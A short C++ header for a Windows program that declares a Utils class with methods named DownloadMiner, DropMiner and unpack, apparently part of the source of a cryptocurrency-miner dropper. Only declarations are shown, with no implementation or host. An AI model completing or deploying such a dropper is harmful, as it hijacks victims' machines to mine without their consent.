#ifndef UTILS_H
#define UTILS_H

#include "ziplib/unzip.h"
#include <strings.h>
#include <windows.h>
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <Wininet.h>

using namespace std;

class Utils
{
	public:
        struct DOWNLOAD_DATA;

        int DownloadMiner(DOWNLOAD_DATA, char *);
        void DropMiner(char *);
        int unpack(char *, char *);
};
#endif
